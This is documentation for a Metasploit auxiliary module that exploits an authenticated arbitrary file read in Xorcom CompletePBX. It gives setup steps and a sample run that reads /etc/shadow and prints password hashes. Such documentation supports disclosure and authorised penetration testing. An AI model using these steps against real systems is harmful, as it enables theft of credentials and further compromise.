## Vulnerable Application

This Metasploit module exploits an **Authenticated File Disclosure** vulnerability in **Xorcom CompletePBX <= 5.2.35**.
The issue arises due to improper handling of user-supplied input
in the **core download functionality**, allowing an attacker to read arbitrary files on the system with **root privileges**.

### Setup

Download the ova file here: [](https://archive.org/details/completepbx-5-2-27-vuln)

## Verification Steps

1. Deploy a vulnerable instance of **Xorcom CompletePBX <= 5.2.35**.
2. Launch **Metasploit Framework**.
3. Use the module:
```
use auxiliary/admin/http/xorcom_completepbx_file_disclosure
```
4. Set the **target host**:
```
set RHOSTS [TARGET_IP]
```
5. Set authentication credentials:
```
set USERNAME [VALID_ADMIN_USERNAME]
set PASSWORD [VALID_ADMIN_PASSWORD]
```
6. Specify the file to read:
```
set TARGETFILE /etc/shadow
```
7. Execute the module:
```
run
```
8. If successful, the contents of the specified file will be displayed.

## Options

- `USERNAME`: Admin username for authentication.
- `PASSWORD`: Admin password for authentication.
- `TARGETFILE`: Path of the file to retrieve (Base64-encoded in request).

## Scenarios

### Successful Exploitation Against a Vulnerable CompletePBX Instance

**Setup**:

- **Target**: Xorcom CompletePBX <= 5.2.35
- **Attacker**: Metasploit Framework instance

**Steps**:

```bash
msf6 auxiliary(admin/http/xorcom_completepbx_file_disclosure) > run http://192.168.56.101/ 
[*] Running module against 192.168.56.101
[*] Attempting authentication with username: admin
[+] Authentication successful! Session ID: sid=535c401396c04a4c92266c2d1457200e6f7c391a
[*] Attempting to read file: /etc/shadow (Encoded as: ,L2V0Yy9zaGFkb3c=)
[+] Content of /etc/shadow:
root:$y$j9T$/vXScZij/ykAtLtP9H1nQ/$KK43hfpOrxdZwAZljjvS5dnF0ipg8NqpCOj9gbLJ9OA:19829:0:99999:7:::
daemon:*:19829:0:99999:7:::
bin:*:19829:0:99999:7:::
sys:*:19829:0:99999:7:::
sync:*:19829:0:99999:7:::
games:*:19829:0:99999:7:::
man:*:19829:0:99999:7:::
lp:*:19829:0:99999:7:::
mail:*:19829:0:99999:7:::
news:*:19829:0:99999:7:::
uucp:*:19829:0:99999:7:::
proxy:*:19829:0:99999:7:::
www-data:*:19829:0:99999:7:::
backup:*:19829:0:99999:7:::
list:*:19829:0:99999:7:::
irc:*:19829:0:99999:7:::
_apt:*:19829:0:99999:7:::
nobody:*:19829:0:99999:7:::
systemd-network:!*:19829::::::
systemd-timesync:!*:19829::::::
messagebus:!:19829::::::
avahi-autoipd:!:19829::::::
sshd:!:19829::::::
pbx:$y$j9T$u6FpdD4iJVvFEqtUSAoFP/$P5iBn5ljpYEwcuXj4F9n6SBlMgWyxjqBDK82ija9Te5:19829:0:99999:7:::
mysql:!:19829::::::
postfix:!:19829::::::
tcpdump:!:19829::::::
Debian-snmp:!:19829::::::
_chrony:!:19829::::::
dnsmasq:!:19829::::::
polkitd:!*:19829::::::
asterisk:!:19829::::::
cc-cloud-rec:!:19829::::::
<br />                                                                                    <b>Fatal error</b>:  Uncaught TypeError: proc_close(): supplied resource is not a valid process resource in /usr/share/ombutel/www/includes/helper.php:61
Stack trace:
#0 /usr/share/ombutel/www/includes/helper.php(61): proc_close()
#1 [internal function]: ombutel\helper::ombutel\{closure}()                               #2 {main}                                                                                   thrown in <b>/usr/share/ombutel/www/includes/helper.php</b> on line <b>61</b><br />

[*] Auxiliary module execution completed
```

### Impact

- This vulnerability grants **full read access to system files as root**.
- Attackers can retrieve **hashed passwords, SSH keys, and configuration files**,
leading to **privilege escalation** and potential full system compromise.

This module is designed to **demonstrate and automate** the exploitation of this issue using the Metasploit framework.
